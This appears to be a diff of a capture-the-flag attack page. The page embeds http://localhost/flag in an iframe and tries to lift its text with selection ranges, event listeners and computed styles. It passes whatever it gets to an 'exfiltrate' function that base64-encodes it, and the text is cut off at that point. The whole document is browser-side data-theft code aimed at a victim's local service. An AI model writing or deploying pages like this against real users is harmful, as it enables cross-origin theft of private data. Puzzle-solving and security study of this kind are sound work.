@@ -1,32 +1,46 @@
 <!DOCTYPE html>
 <html>
-    <head>HEHE</head>
+    <head>hehe1</head>
 <body>
-<iframe id="target" src="http://localhost/flag" width="100%" height="500"></iframe>
+<iframe id="flagFrame" src="http://localhost/flag" width="100%" height="500"></iframe>
 <script>
-// Wait for iframe to load, then try to access content
 setTimeout(() => {
-    const iframe = document.getElementById('target');
-    try {
-        // This will fail due to CORS, but might work in some configurations
-        const content = iframe.contentDocument.body.innerText;
-        exfiltrate('iframe_content', content);
-    } catch(e) {
-        exfiltrate('iframe_error', e.toString());
-        
-        // Alternative: Take screenshot of what's visible
-        takeScreenshotAlternative();
-    }
-}, 3000);
-
-function takeScreenshotAlternative() {
-    // If we can't read content, at least we know the page loaded
-    exfiltrate('status', 'Iframe loaded successfully - flag might be visible');
+    const iframe = document.getElementById('flagFrame');
     
-    // Try to trigger any JavaScript on the localhost page
-    const iframe = document.getElementById('target');
-    iframe.src = 'http://localhost/flag?callback=alert';
-}
+    // Method 1: Try to copy content via selection
+    try {
+        const iframeWindow = iframe.contentWindow;
+        const selection = iframeWindow.getSelection();
+        const range = iframeWindow.document.createRange();
+        range.selectNodeContents(iframeWindow.document.body);
+        selection.removeAllRanges();
+        selection.addRange(range);
+        
+        // Try to get selected text
+        const selectedText = selection.toString();
+        if (selectedText.length > 0) {
+            exfiltrate('selected_text', selectedText);
+        }
+    } catch(e) {
+        exfiltrate('selection_error', e.toString());
+    }
+    
+    // Method 2: Try to trigger right-click context menu info
+    iframe.contentWindow.document.addEventListener('contextmenu', (e) => {
+        exfiltrate('contextmenu', 'Context menu triggered');
+    });
+    
+    // Method 3: Try to get computed styles (might leak content)
+    try {
+        const styles = iframe.contentWindow.getComputedStyle(iframe.contentWindow.document.body);
+        exfiltrate('body_styles', JSON.stringify({
+            color: styles.color,
+            fontSize: styles.fontSize,
+            content: styles.content
+        }));
+    } catch(e) {}
+    
+}, 3000);
 
 function exfiltrate(type, data) {
     const encoded = btoa(data);
